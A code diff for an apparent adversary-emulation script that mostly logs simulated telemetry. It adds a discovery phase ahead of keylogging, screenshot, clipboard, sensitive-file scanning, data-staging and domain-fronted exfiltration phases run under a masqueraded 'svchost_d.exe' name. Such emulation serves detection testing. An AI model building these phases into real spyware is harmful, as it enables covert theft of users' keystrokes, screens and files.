@@ -20,6 +20,7 @@ from pathlib import Path
 from telemetry_helper import check_environment, emit, EnvSafety, set_phase
 from c2_helper import fronted_beacon, emit_heartbeats, jittered_sleep, FRONT_DOMAINS
 from naming_helper import phase_delay
+from defense_helper import emit_system_discovery, emit_process_discovery
 
 
 def main() -> int:
@@ -41,7 +42,12 @@ def main() -> int:
 
     user = os.environ.get("USERPROFILE", r"C:\Users\guestuser")
 
-    # Phase 1: Keylogger hook
+    # Phase 1: System Discovery (T1082, T1057, T1518)
+    emit_system_discovery("svchost_d.exe")
+    emit_process_discovery("svchost_d.exe")
+    time.sleep(phase_delay("system_discovery"))
+
+    # Phase 2: Keylogger hook
     if env != EnvSafety.SUSPICIOUS:
         set_phase("keylogger")
         emit("PROCESS", "KEYLOGGER", "svchost_d.exe", "CRITICAL",
@@ -52,7 +58,7 @@ def main() -> int:
              detail="Keyboard capture configuration written")
         time.sleep(phase_delay("keylogger"))
 
-    # Phase 2: Screenshot capture
+    # Phase 3: Screenshot capture
     set_phase("screen_capture")
     screenshots_dir = Path(os.environ.get("TEMP", r"C:\Windows\Temp")) / "~scr"
     screenshots_dir.mkdir(parents=True, exist_ok=True)
@@ -64,7 +70,7 @@ def main() -> int:
              detail=f"Screenshot captured #{i+1}", technique_id="T1113")
         time.sleep(phase_delay("screenshot"))
 
-    # Phase 3: Clipboard monitoring
+    # Phase 4: Clipboard monitoring
     if env != EnvSafety.SUSPICIOUS:
         set_phase("clipboard")
         emit("PROCESS", "CLIPBOARD", "svchost_d.exe", "WARNING",
@@ -73,7 +79,7 @@ def main() -> int:
         (screenshots_dir / "clipboard.log").write_text("clipboard_data_placeholder")
         time.sleep(phase_delay("keylogger"))
 
-    # Phase 4: Sensitive file scanning
+    # Phase 5: Sensitive file scanning
     set_phase("file_discovery")
     scan_dirs = [Path(user) / "Documents", Path(user) / "Desktop", Path(user) / "Downloads"]
     found = 0
@@ -90,14 +96,14 @@ def main() -> int:
                      detail=f"Sensitive file indexed: {f.name}")
         time.sleep(phase_delay("file_scan"))
 
-    # Phase 5: Data staging
+    # Phase 6: Data staging
     set_phase("staging")
     staging = screenshots_dir / "staged.dat"
     staging.write_text(f"harvested_files={found}\nscreenshots=3\nclipboard=captured\n")
     emit("FILE", "CREATE_FILE", str(staging), "CRITICAL",
          source_process="svchost_d.exe", detail="Harvested data staged for exfil")
 
-    # Phase 6: Exfiltration (domain-fronted)
+    # Phase 7: Exfiltration (domain-fronted)
     if env != EnvSafety.SUSPICIOUS:
         set_phase("exfiltration")
         for server in ["10.13.37.60", "10.13.37.61"]:
